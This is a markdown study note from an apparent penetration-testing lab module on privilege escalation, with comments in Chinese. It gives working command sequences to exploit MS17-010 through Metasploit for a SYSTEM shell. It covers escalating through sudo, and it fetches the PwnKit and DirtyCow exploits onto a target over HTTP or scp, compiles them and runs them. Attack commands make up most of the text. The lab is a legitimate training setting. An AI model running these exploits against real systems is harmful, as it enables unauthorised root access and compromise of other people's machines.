Penetration Test - Privilege Escalation
===

🔙 [MENU README](../README.md)


# iLab
Module 6 
```
Parrot Security       192.168.0.18    172.19.19.18
Windows Server 2019   192.168.0.20
Windows Server 2008   192.168.0.7, 21
SSH Server            192.168.0.70
WordPress             192.168.0.24
```

---

> PayloadsAllTheThings
> https://github.com/swisskyrepo/PayloadsAllTheThings

# MS17-010
Detect and Scan
```bash

nmap 192.168.0.7 -sVC -n -Pn
# 發現port 445

nmap 192.168.0.7 -sVC -n -Pn -p445 --script smb-protocols.nse
# 對 port 445深度探測，發現版本smb v1
# SMBv1 有 MS17_010 漏洞

nmap 192.168.0.7 -sVC -n -Pn -p445 --script smb-vuln-ms17-010.nse
# 針對 MS17_010 漏洞 進行探測


# Nmap中的Script : ls /usr/share/nmap/scripts/
```
Metasploit
```bash
msfconsole -q # without banner

# set paylaod
msf > search ms17_010
msf > use 2
msf > show options
msf > set rhosts 192.168.0.7
msf > check
msf > exploit  # Attack Success when see "WIN"


# WIN
getuid  # Server username: NT AUTHORITY\SYSTEM
shell
whoami
```

# Sudo
```bash
# su    切換至目標帳號/需要目標帳號密碼
# sudo  預授權
#        是否需要驗證(自己的密碼)
#        路徑、檔名、參數  ex. /bin/target -i


sudo -l
# (ALL:ALL) ALL

sudo -i
# 直接提權
```
```bash
# 去百科全書查找
GTFOBins
```

# PwnKit
低版本Kernel的通殺提權
> https://github.com/ly4k/PwnKit
```bash
# Version Check
uname -a

wget https://github.com/ly4k/PwnKit/raw/main/PwnKit
wget https://github.com/ly4k/PwnKit/raw/main/PwnKit32

# Pass1
sudo python3 -m http.server 80
wget 192.168.0.18/PwnKit
# Pass2
scp PwnKit aleksander@192.168.0.70:~/.

# 一般kernel exploit希望執行的路徑有寫入權限
# /tmp是不錯的選擇
chmod +x PwnKit && ./PwnKit
```

# DirtyCow
```bash
# 更低版本的Linux : Linux Kernel 2.6.22 < 3.9
# https://www.exploit-db.com/exploits/40847
searchsploit -m 40847

# Pass1
sudo python3 -m http.server 80
wget 192.168.0.18/40847.cpp
# Pass2
scp 40847.cpp aleksander@192.168.0.70:~/.

# how to use : head 40847.cpp
g++ -Wall -pedantic -02 -std=c++11 -pthread -o dcow 40847.cpp -lutil
./dcow -s
```